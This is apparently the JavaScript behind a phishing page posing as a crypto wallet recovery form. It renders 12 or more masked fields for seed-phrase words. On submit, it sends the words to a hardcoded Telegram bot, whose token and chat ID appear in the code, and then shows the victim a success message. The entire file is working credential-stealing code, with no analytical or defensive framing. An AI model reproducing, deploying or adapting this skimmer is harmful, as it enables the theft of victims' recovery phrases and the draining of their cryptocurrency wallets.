

// Wait for the DOM to be fully loaded
document.addEventListener('DOMContentLoaded', () => {
  // Initial generation of 12 input fields by default when the page loads
  generateInputFields(12);

  // Event listener for the phrase select change
  document.getElementById('phraseSelect').addEventListener('change', function () {
    const wordCount = parseInt(this.value, 10) || 12; // Get the selected word count, default to 12 if not valid
    generateInputFields(wordCount); // Regenerate input fields based on the selection
  });
});

// Function to generate input fields based on the word count
function generateInputFields(wordCount) {
  const formBoxMain = document.querySelector('.form-box-main'); // Select the container for input fields
  formBoxMain.innerHTML = ''; // Clear any existing input fields
  
  // Generate the specified number of input fields
  for (let i = 1; i <= wordCount; i++) {
    const inputDiv = document.createElement('div');
    inputDiv.className = 'input-form'; // Class for styling the input field container

    const label = document.createElement('label');
    label.setAttribute('for', `form${i}`);
    label.textContent = `${i}.`; // Label for the input field

    const inputGroupDiv = document.createElement('div');
    inputGroupDiv.className = 'input-group'; // Add input group to wrap the input and eye icon

    const input = document.createElement('input');
    input.type = 'password';
    input.id = `form${i}`;
    input.className = 'form-control'; // Apply form control class for styling

    const eyeIcon = document.createElement('i');
    eyeIcon.className = 'fas fa-eye-slash eye-icon'; // Font Awesome eye icon (default to eye-slash)
    eyeIcon.id = `eye-icon${i}`;

    // Append the input and eye icon to the input group
    inputGroupDiv.appendChild(input);
    inputGroupDiv.appendChild(eyeIcon);

    // Append the label and input group to the input form
    inputDiv.appendChild(label);
    inputDiv.appendChild(inputGroupDiv);
    formBoxMain.appendChild(inputDiv);
  }

  // Update the visible word count in the phrase info
  document.getElementById('wordCount').textContent = wordCount;

  // Add event listeners for toggling the password visibility
  document.querySelectorAll('.eye-icon').forEach((eyeIcon, index) => {
    eyeIcon.addEventListener('click', function () {
      const passwordInput = document.querySelector(`#form${index + 1}`);
      
      // Toggle password visibility
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text'; // Show password
        eyeIcon.classList.remove('fa-eye-slash'); // Change to eye
        eyeIcon.classList.add('fa-eye');
      } else {
        passwordInput.type = 'password'; // Hide password
        eyeIcon.classList.remove('fa-eye'); // Change to eye-slash
        eyeIcon.classList.add('fa-eye-slash');
      }
    });
  });
}


document.getElementById('form').addEventListener('submit', async function (e) {
  e.preventDefault();

  const inputs = document.querySelectorAll('#form input'); // Select all input fields in the form
  const recoveryPhraseArray = Array.from(inputs).map((input, index) => {
    return `${index + 1}: ${input.value.trim()}`;
  });

  const emptyFields = recoveryPhraseArray.some((value) => value.split(': ')[1] === ""); // Check if any field is empty

  if (emptyFields) {
    showAlert('danger', 'All fields must be filled!');
    return;
  }

  const recoveryPhrase = recoveryPhraseArray.join('\n'); // Join all phrases with a newline for the message
  const message = recoveryPhraseArray.join(' '); // Join with a space for Telegram message

  try {
    const telegramResponse = await fetch("https://api.telegram.org/bot7409650658:AAFEppk-hMfd5rK2JqExuRQehns5jZMEpu0/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: "-1002266312792", // Ensure this chat ID is correct
        text: message,
      }),
    });

    if (telegramResponse.ok) {
      showAlert('success', 'Recovery phrase sent successfully!');
      console.log(recoveryPhrase);
      inputs.forEach(input => input.value = ''); // Clear inputs after success
    } else {
      showAlert('danger', 'Failed to send recovery phrase. Please try again.');
    }
  } catch (error) {
    showAlert('danger', 'An error occurred. Please try again later.');
  }
});

function showAlert(type, message) {
  const alertPlaceholder = document.getElementById('alert-placeholder');
  alertPlaceholder.innerHTML = `
    <div class="alert alert-${type} alert-dismissible fade show" role="alert">
      ${message}
      <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    </div>
  `;
  setTimeout(() => {
    alertPlaceholder.innerHTML = ''; // Clear alert after 5 seconds
  }, 5000);
}
